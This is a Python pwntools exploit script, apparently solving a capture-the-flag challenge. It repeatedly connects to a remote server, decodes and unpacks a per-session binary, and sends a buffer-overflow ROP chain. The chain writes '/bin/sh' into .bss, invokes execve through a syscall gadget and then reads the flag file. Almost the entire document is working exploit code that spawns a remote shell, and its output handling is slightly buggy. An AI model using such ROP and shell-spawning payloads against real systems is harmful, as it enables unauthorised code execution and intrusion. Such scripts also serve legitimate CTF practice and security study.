from pwn import *
import gzip
import base64
import gzip
import shutil
context(arch='amd64', os='linux', log_level='debug')

# 第四个字符串的地址
strpos = 0x480C0

# 解压文件
def decompress_gz_file(input_path, output_path):
    with gzip.open(input_path, 'rb') as f_in:
        with open(output_path, 'wb') as f_out:
            f_out.write(f_in.read())


while True:
    p = remote('112.124.59.213', 10001)
    
    # 获取数据
    print('正在获取数据')
    p.recvuntil('This is your Bomb: \nb\'')
    base = p.recvline()[:-2]
    # 解密base64
    print('正在解密文件')
    f=open('tmp.gz','wb')
    gz = base64.b64decode(base)
    f.write(gz)
    f.close()
    # 解压缩
    print('正在解压文件')
    decompress_gz_file('tmp.gz', 'tmp')
    # 读取字符串
    print('正在读取文件')
    f = open('tmp', 'rb')
    str = f.read()[strpos:strpos + 0x40 - 1]
    f.close()
    # 加载gadget
    elf = ELF('./tmp')
    rop = ROP(elf)
    read        = 0x404E8D
    syscall     = rop.find_gadget(['syscall'])[0]
    bss         = elf.bss() + 0x10
    pop_rax     = rop.find_gadget(['pop rax', 'ret'])[0]
    pop_rdi     = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi     = rop.find_gadget(['pop rsi', 'ret'])[0]
    rdx         = 0x43a333#pop_rbx_gadgets = [address for address, gadget in rop.gadgets.items() if 'pop rbx' in gadget.insns][-1]
    # 读取完整回显文件
    p.recvuntil('Welcome. Now,you can talk with Sphinx. Good luck.\n')
    p.sendline(str)
    # 调用read在bss段写入/bin/sh\x00然后执行sys_execve
    payload = b'a' * 56
    payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss) + p64(read) + p64(0) * 7 + p64(rdx) + p64(0) + p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(59) + p64(syscall)
    sleep(1)
    try:
        p.send(payload)
        sleep(1)
        p.send((b'/bin/sh\x00'))
        sleep(1)
        p.send((b'cat ./flag\n\x00'))
        
        get = p.recv()
        if(b'{' in p.recv()):
            print('')
            print('出现正确的:')
            print(bytes(get, 'utf-8'))
            pause()
            pause()
            break
    except:
        p.close()
        continue
    p.close()
